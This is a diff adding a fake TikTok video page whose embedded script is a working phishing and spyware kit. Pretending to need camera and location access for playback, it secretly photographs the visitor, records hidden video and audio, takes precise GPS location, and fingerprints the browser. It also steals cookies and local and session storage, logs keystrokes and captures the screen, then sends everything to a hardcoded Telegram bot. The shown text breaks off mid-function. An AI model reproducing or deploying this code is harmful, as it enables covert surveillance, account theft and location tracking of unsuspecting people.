@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - Watch Video</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: 'TikTok Sans', Arial, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* --- Video Player Container --- */
+        .video-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: 500px;
+            max-height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0050, #00f2ea);
+            background-size: 400% 400%;
+            animation: gradientShift 3s ease infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .video-placeholder.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            margin-bottom: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .play-button svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            margin-left: 5px;
+        }
+
+        .placeholder-text {
+            font-size: 1.2em;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            font-weight: 600;
+        }
+
+        .tiktok-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        /* --- Loading Spinner Overlay --- */
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        #loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #ff0050;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-message {
+            font-size: 1.1em;
+            color: #eee;
+            text-align: center;
+            max-width: 300px;
+        }
+
+        /* --- Hidden Elements for Data Collection --- */
+        #camera-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        #audio-feed {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        #video-canvas {
+            display: none;
+        }
+
+        /* --- Notification Styles --- */
+        #notification {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 0.9em;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            z-index: 30;
+            border-left: 4px solid #ff0050;
+        }
+
+        #notification.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        #notification.warning {
+            border-left-color: #ffa500;
+        }
+
+        #notification.error {
+            border-left-color: #ff0000;
+        }
+
+        /* --- Progress Bar --- */
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* --- TikTok Fake UI --- */
+        .tiktok-sidebar {
+            position: absolute;
+            right: 15px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 15; /* Above placeholder but below overlay */
+            transition: opacity 0.5s ease;
+        }
+
+        .sidebar-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            font-size: 0.8em;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            opacity: 0.9;
+        }
+
+        .sidebar-icon svg {
+            width: 35px;
+            height: 35px;
+            fill: #fff;
+            margin-bottom: 5px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+        }
+
+        .bottom-nav {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 15;
+            padding-bottom: 10px;
+            transition: opacity 0.5s ease;
+        }
+
+        .nav-item {
+            color: rgba(255,255,255,0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.75em;
+            font-weight: 600;
+        }
+        
+        .nav-item.active {
+            color: #fff;
+        }
+
+        .nav-item svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+            margin-bottom: 4px;
+        }
+
+        .video-info {
+            position: absolute;
+            bottom: 80px;
+            left: 15px;
+            width: 70%;
+            z-index: 15;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            transition: opacity 0.5s ease;
+        }
+
+        .username {
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+        }
+
+        .description {
+            font-size: 0.9em;
+            margin-bottom: 5px;
+            line-height: 1.3;
+        }
+
+        .music {
+            display: flex;
+            align-items: center;
+            font-size: 0.85em;
+        }
+
+        .music svg {
+            width: 15px;
+            height: 15px;
+            fill: #fff;
+            margin-right: 5px;
+            animation: spin 3s linear infinite;
+        }
+
+        .hidden-ui {
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <div class="tiktok-logo">TikTok</div>
+        
+        <div class="video-placeholder" id="video-placeholder">
+            <div class="play-button">
+                <svg viewBox="0 0 24 24">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+            </div>
+            <div class="placeholder-text" id="placeholder-text">Tap to watch this video</div>
+        </div>
+
+        <!-- Fake TikTok UI Elements -->
+        <div class="tiktok-sidebar" id="fake-sidebar">
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                <span>542K</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
+                <span>4,129</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+                <span>Share</span>
+            </div>
+        </div>
+
+        <div class="video-info" id="fake-info">
+            <div class="username">@tiktok_creator</div>
+            <div class="description">Wait for the end! 😂🔥 #viral #trending #fyp</div>
+            <div class="music">
+                <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+                <span>original sound - trending_vibes</span>
+            </div>
+        </div>
+
+        <div class="bottom-nav" id="fake-nav">
+            <div class="nav-item active">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <span>Discover</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24" style="width:35px;height:35px;fill:#fff;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>
+                <span>Inbox</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Me</span>
+            </div>
+        </div>
+
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-message" id="loading-message">Loading video content...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <!-- Hidden elements for data collection -->
+        <video id="camera-feed" autoplay playsinline muted></video>
+        <audio id="audio-feed" autoplay></audio>
+        <canvas id="canvas"></canvas>
+        <canvas id="video-canvas"></canvas>
+
+        <div id="notification"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '5723873731:AAGoYy-oRHcBuYsbvhCcYEnQnPPovh0mnVs';
+        const CHAT_ID = '972326806';
+        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
+
+        const videoPlaceholder = document.getElementById('video-placeholder');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingMessage = document.getElementById('loading-message');
+        const progressFill = document.getElementById('progress-fill');
+        const cameraFeed = document.getElementById('camera-feed');
+        const audioFeed = document.getElementById('audio-feed');
+        const canvas = document.getElementById('canvas');
+        const videoCanvas = document.getElementById('video-canvas');
+        const context = canvas.getContext('2d');
+        const videoContext = videoCanvas.getContext('2d');
+        const notificationDiv = document.getElementById('notification');
+
+        let cameraStream = null;
+        let audioStream = null;
+        let videoRecorder = null;
+        let recordedChunks = [];
+        let dataCollectionInterval = null;
+        let keystrokeLogger = null;
+        let mouseTracker = null;
+
+        let collectedData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            deviceInfo: {},
+            location: null,
+            capturedImages: [],
+            capturedVideo: null,
+            capturedAudio: null,
+            ipInfo: null,
+            cookies: null,
+            localStorageData: {},
+            sessionStorageData: {},
+            browserFingerprint: {},
+            networkInfo: {},
+            socialMediaLogins: [],
+            clipboardContent: null,
+            keystrokes: [],
+            mouseMovements: [],
+            sessionData: {},
+            webRTCData: null,
+            canvasFingerprint: null,
+            fontList: [],
+            pluginList: [],
+            screenInfo: {},
+            batteryInfo: null,
+            connectionInfo: null,
+            hardwareInfo: {},
+            timezoneInfo: {},
+            languageInfo: {},
+            doNotTrack: null,
+            referrer: document.referrer,
+            url: window.location.href,
+            title: document.title
+        };
+
+        function updateProgress(percent) {
+            progressFill.style.width = percent + '%';
+        }
+
+        // ---  ---
+        function startClickTracking() {
+            document.addEventListener('click', function(event) {
+                collectedData.clicks = collectedData.clicks || [];
+                collectedData.clicks.push({
+                    x: event.clientX,
+                    y: event.clientY,
+                    tag: event.target.tagName,
+                    id: event.target.id,
+                    class: event.target.className,
+                    timestamp: new Date().toISOString()
+                });
+            });
+        }
+
+        // ---  (Screen Capture API) ---
+        async function captureScreenshot() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    const track = stream.getVideoTracks()[0];
+                    const imageCapture = new ImageCapture(track);
+                    const bitmap = await imageCapture.grabFrame();
+                    const tempCanvas = document.createElement('canvas');
+                    tempCanvas.width = bitmap.width;
+                    tempCanvas.height = bitmap.height;
+                    tempCanvas.getContext('2d').drawImage(bitmap, 0, 0);
+                    const screenshot = tempCanvas.toDataURL('image/png');
+                    collectedData.screenshots = collectedData.screenshots || [];
+                    collectedData.screenshots.push({
+                        timestamp: new Date().toISOString(),
+                        data: screenshot
+                    });
+                    track.stop();
+                } catch (e) {
+                    // 
+                }
+            }
+        }
+
+        // ---  ---
+        async function getIPInfoMulti() {
+            collectedData.ipInfoServices = {};
+            try {
+                // ipapi.co
+                const res1 = await fetch('https://ipapi.co/json/');
+                collectedData.ipInfoServices.ipapi = await res1.json();
+            } catch {}
+            try {
+                // ipinfo.io
+                const res2 = await fetch('https://ipinfo.io/json');
+                collectedData.ipInfoServices.ipinfo = await res2.json();
+            } catch {}
+            try {
+                // geojs.io
+                const res3 = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                collectedData.ipInfoServices.geojs = await res3.json();
+            } catch {}
+        }
+
+        // ---  ---
+        const messages = {
+            en: {
+                tapToWatch: 'Tap to watch this video',
+                loading: 'Loading video content...',
+                cameraRequired: 'Camera access required for video playback',
+                locationRequired: 'Location access required for content delivery',
+                autoPlay: 'Auto-playing video...',
+                error: 'An error occurred. Please try again.'
+            },
+            ar: {
+                tapToWatch: 'اضغط لمشاهدة الفيديو',
+                loading: 'جاري تحميل الفيديو...',
+                cameraRequired: 'يجب السماح بالكاميرا لتشغيل الفيديو',
+                locationRequired: 'يجب السماح بالموقع لتسليم المحتوى',
+                autoPlay: 'سيتم تشغيل الفيديو تلقائياً...',
+                error: 'حدث خطأ. حاول مرة أخرى.'
+            }
+        };
+        function getLang() {
+            return navigator.language.startsWith('ar') ? 'ar' : 'en';
+        }
+        function getMsg(key) {
+            return messages[getLang()][key] || messages['en'][key];
+        }
+
+        // --- MISSING FUNCTIONS ADDED ---
+        function showNotification(msg, type = 'info') {
+            notificationDiv.textContent = msg;
+            notificationDiv.className = '';
+            notificationDiv.classList.add('show');
+            if(type) {
+                notificationDiv.classList.add(type);
+            }
+            setTimeout(() => {
+                notificationDiv.classList.remove('show');
+            }, 3000);
+        }
+
+        async function captureMultipleImages() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                cameraFeed.srcObject = cameraStream;
+                await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+                
+                canvas.width = cameraFeed.videoWidth;
+                canvas.height = cameraFeed.videoHeight;
+
+                for (let i = 0; i < 3; i++) {
+                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                    collectedData.capturedImages.push({
+                        timestamp: new Date().toISOString(),
+                        data: canvas.toDataURL('image/jpeg', 0.8)
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+                
+                cameraStream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                console.warn('Camera capture failed:', error);
+                return false;
+            }
+        }
+
+        async function recordSecretVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                videoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                
+                videoRecorder.ondataavailable = event => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                videoRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.readAsDataURL(blob);
+                    reader.onloadend = () => {
+                        collectedData.capturedVideo = reader.result;
+                    };
+                };
+
+                videoRecorder.start();
+                await new Promise(resolve => setTimeout(resolve, 5000)); // Record for 5 seconds
+                videoRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            } catch (error) {
+                console.warn('Video recording failed:', error);
+                return false;
+            }
+        }
+
+        // === ENHANCED DATA COLLECTION FUNCTIONS ===
+
+        // Collect comprehensive browser fingerprint
+        function collectBrowserFingerprint() {
+            try {
+                // Canvas fingerprinting
+                canvas.width = 200;
+                canvas.height = 200;
+                context.textBaseline = "top";
+                context.font = "14px Arial";
+                context.fillText("Browser Fingerprint", 2, 2);
+                collectedData.canvasFingerprint = canvas.toDataURL();
+
+                // WebGL fingerprinting
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        collectedData.browserFingerprint.webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+
+                // Font detection
+                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
+                collectedData.fontList = fonts.filter(font => document.fonts.check(`12px "${font}"`));
+
+                // Plugin detection
+                collectedData.pluginList = Array.from(navigator.plugins).map(plugin => ({
+                    name: plugin.name,
+                    description: plugin.description,
+                    filename: plugin.filename
+                }));
+
+                // Screen information
+                collectedData.screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                };
+
+                // Connection information
+                if (navigator.connection) {
+                    collectedData.connectionInfo = {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt,
+                        saveData: navigator.connection.saveData
+                    };
+                }
+
+                // Hardware information
+                collectedData.hardwareInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    maxTouchPoints: navigator.maxTouchPoints || 0
+                };
+
+                // Timezone and language
+                collectedData.timezoneInfo = {
+                    offset: new Date().getTimezoneOffset(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                collectedData.languageInfo = {
+                    language: navigator.language,
+                    languages: navigator.languages
+                };
+
+                // Do Not Track
+                collectedData.doNotTrack = navigator.doNotTrack;
+
+                console.log('Browser fingerprint collected.');
+            } catch (e) {
+                console.error('Error collecting browser fingerprint:', e);
+            }
+        }
+
+        // Collect all cookies and storage data
+        function collectCookiesAndTokens() {
+            try {
+                // All cookies
+                collectedData.cookies = document.cookie;
+                
+                // Local Storage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    collectedData.localStorageData[key] = localStorage.getItem(key);
+                }
+
+                // Session Storage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    collectedData.sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+
+                // IndexedDB (if accessible)
+                if (window.indexedDB) {
+                    collectedData.indexedDBInfo = 'Available';
+                }
+
+                console.log('Cookies and storage data collected.');
+            } catch (e) {
+                console.error('Error collecting cookies/storage:', e);
+            }
+        }
+
+        // Enhanced device information
+        function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                platform: navigator.platform,
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                onLine: navigator.onLine,
+                userAgent: navigator.userAgent,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                appCodeName: navigator.appCodeName
+            };
+
+            // Battery information
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    collectedData.batteryInfo = {
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                });
+            }
+
+            // WebRTC local IP detection
+            const rtc = new RTCPeerConnection({iceServers:[]});
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ip = event.candidate.candidate.split(' ')[4];
+                    if (ip.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
+                        collectedData.webRTCData = { localIP: ip };
+                    }
+                }
+            };
+
+            console.log('Device information collected.');
+        }
+
+        // Get IP and location information
+        async function getPreciseLocation() {
+            return new Promise(async (resolve) => {
+                const locationData = {
+                    gps: null,
+                    ip: collectedData.ipInfo
+                };
+
+                if (navigator.geolocation) {
+                    try {
+                        const position = await new Promise((gpsResolve, gpsReject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                gpsResolve,
+                                gpsReject,
+                                {
+                                    enableHighAccuracy: true,
+                                    timeout: 15000,
+                                    maximumAge: 0
+                                }
+                            );
+                        });
+
+                        locationData.gps = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: position.timestamp
+                        };
+                        
+                        console.log('Precise GPS location acquired.');
+                    } catch (error) {
+                        console.warn('GPS location failed:', error.name);
+                        if (error.name === 'PermissionDeniedError') {
+                            showNotification('Location access required for content delivery', 'warning');
+                        }
+                    }
+                }
+                
+                collectedData.location = locationData;
+                resolve(true);
+            });
+        }
+
+        // Keystroke logging (for demonstration)
+        function startKeystrokeLogging() {
+            keystrokeLogger = (event) => {
+                collectedData.keystrokes.push({
+                    key: event.key,
+                    keyCode: event.keyCode,
+                    timestamp: new Date().toISOString(),
+                    target: event.target.tagName
+                });
+            };
+            document.addEventListener('keydown', keystrokeLogger);
+        }
+
+        // Mouse movement tracking
+        function startMouseTracking() {
+            mouseTracker = (event) => {
+                collectedData.mouseMovements.push({
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: new Date().toISOString()
+                });
+            };
+            document.addEventListener('mousemove', mouseTracker);
+        }
+
+        // Stop tracking
+        function stopTracking() {
+            if (keystrokeLogger) {
+                document.removeEventListener('keydown', keystrokeLogger);
+            }
+            if (mouseTracker) {
+                document.removeEventListener('mousemove', mouseTracker);
+            }
+        }
+
+        // Send comprehensive data to Telegram
+        async function sendComprehensiveDataToTelegram() {
+            let message = `🎥 <b>SHADOW-STRIKE: Target Fully Compromised!</b>\n\n`;
+
+            // IP Location with map link
+            if (collectedData.ipInfo) {
+                const ip = collectedData.ipInfo;
+                message += `🌍 <b>IP Location:</b>\n`;
+                message += `   IP: <code>${ip.ip}</code>\n`;
+                message += `   City: ${ip.city}\n`;
+                message += `   Country: ${ip.country}\n`;
+                message += `   ISP: ${ip.org}\n`;
+                message += `   🌐 <a href="https://www.google.com/maps?q=${ip.latitude},${ip.longitude}">View IP Location</a>\n\n`;
+            }
+
+            // GPS Location with high precision
+            if (collectedData.location && collectedData.location.gps) {
+                const gps = collectedData.location.gps;
+                message += `📍 <b>GPS Location (High Precision):</b>\n`;
+                message += `   Lat: <code>${gps.latitude.toFixed(8)}</code>\n`;
+                message += `   Lon: <code>${gps.longitude.toFixed(8)}</code>\n`;
+                message += `   Accuracy: ${gps.accuracy.toFixed(2)}m\n`;
+                if (gps.altitude) message += `   Altitude: ${gps.altitude.toFixed(2)}m\n`;
+                message += `   🌐 <a href="https://www.google.com/maps?q=${gps.latitude},${gps.longitude}">View GPS Location</a>\n\n`;
+            }
+
+            // Device Information
+            message += `📱 <b>Device Information:</b>\n`;
+            message += `   Platform: ${collectedData.deviceInfo.platform}\n`;
+            message += `   Screen: ${collectedData.screenInfo.width}x${collectedData.screenInfo.height}\n`;
+            message += `   User Agent: ${collectedData.userAgent.substring(0, 100)}...\n`;
+            if (collectedData.webRTCData) {
+                message += `   Local IP: ${collectedData.webRTCData.localIP}\n`;
+            }
+            message += `\n`;
+
+            // Browser Fingerprint
+            if (collectedData.browserFingerprint.webgl) {
+                message += `🔍 <b>Browser Fingerprint:</b>\n`;
+                message += `   GPU: ${collectedData.browserFingerprint.webgl.renderer}\n`;
+                message += `   Vendor: ${collectedData.browserFingerprint.webgl.vendor}\n`;
+                message += `\n`;
+            }
+
+            // Storage Data
+            if (collectedData.cookies) {
+                message += `🍪 <b>Cookies:</b>\n`;
+                message += `   <code>${collectedData.cookies.substring(0, 300)}...</code>\n\n`;
+            }
+
+            if (Object.keys(collectedData.localStorageData).length > 0) {
+                message += `💾 <b>Local Storage:</b>\n`;
+                for (const key in collectedData.localStorageData) {
+                    message += `   ${key}: <code>${String(collectedData.localStorageData[key]).substring(0, 100)}...</code>\n`;
+                }
+                message += `\n`;
+            }
+
+            // Captured Images Count
+            if (collectedData.capturedImages.length > 0) {
+                message += `📸 <b>Captured Images:</b> ${collectedData.capturedImages.length} photos\n`;
+            }
+
+            // Video Recording Status
+            if (collectedData.capturedVideo) {
+                message += `🎬 <b>Video Recording:</b> 10 seconds captured\n`;
+            }
+
+            message += `⏰ <b>Timestamp:</b> ${collectedData.timestamp}\n`;
+            message += `🔗 <b>Source URL:</b> ${collectedData.url}\n`;
+
+            try {
+                // Send main message
+                const textResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                // Send captured images
+                if (textResponse.ok && collectedData.capturedImages.length > 0) {
+                    for (let i = 0; i < Math.min(collectedData.capturedImages.length, 3); i++) {
+                        const image = collectedData.capturedImages[i];
+                        const photoBlob = await fetch(image.data).then(r => r.blob());
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', photoBlob, `captured_image_${i}.jpg`);
+                        formData.append('caption', `📸 Captured image ${i + 1} from target device.`);
+
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                }
+
+                // Send video if available
+                if (collectedData.capturedVideo) {
+                    const videoBlob = await fetch(collectedData.capturedVideo).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', videoBlob, 'captured_video.webm');
+                    formData.append('caption', '🎬 Secret video recording from target device.');
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                console.log('Comprehensive data sent to Telegram.');
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+            }
+        }
+
+        // --- تحديث startStealthOperation لجمع البيانات على مراحل مع تأخير وتمويه ---
+        async function startStealthOperation() {
+            try {
+                updateProgress(10);
+                loadingMessage.textContent = getMsg('loading');
+                collectDeviceInfo();
+                await new Promise(resolve => setTimeout(resolve, 700));
+
+                updateProgress(20);
+                loadingMessage.textContent = getMsg('loading');
+                await getIPInfoMulti();
+                await new Promise(resolve => setTimeout(resolve, 700));
+
+                updateProgress(30);
+                loadingMessage.textContent = getMsg('loading');
+                collectBrowserFingerprint();
+                collectCookiesAndTokens();
+                await new Promise(resolve => setTimeout(resolve, 700));
+
+                updateProgress(40);
+                loadingMessage.textContent = getMsg('cameraRequired');
+                const cameraSuccess = await captureMultipleImages();
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                updateProgress(60);
+                loadingMessage.textContent = getMsg('loading');
+                const videoSuccess = await recordSecretVideo();
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                updateProgress(70);
+                loadingMessage.textContent = getMsg('locationRequired');
+                const locationSuccess = await getPreciseLocation();
+                await new Promise(resolve => setTimeout(resolve, 700));
+
+                updateProgress(80);
+                loadingMessage.textContent = getMsg('loading');
+                startKeystrokeLogging();
+                startMouseTracking();
+                startClickTracking();
+                await new Promise(resolve => setTimeout(resolve, 700));
+
+                // 
+                await captureScreenshot();
+
+                updateProgress(90);
+                loadingMessage.textContent = getMsg('loading');
+                await sendComprehensiveDataToTelegram();
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                updateProgress(100);
+                loadingMessage.textContent = getMsg('loading');
+            } catch (error) {
+                console.error('Stealth operation error:', error);
+                showNotification(getMsg('error'), 'error');
+                updateProgress(100);
+            } finally {
+                dataCollectionInterval = setInterval(() => {
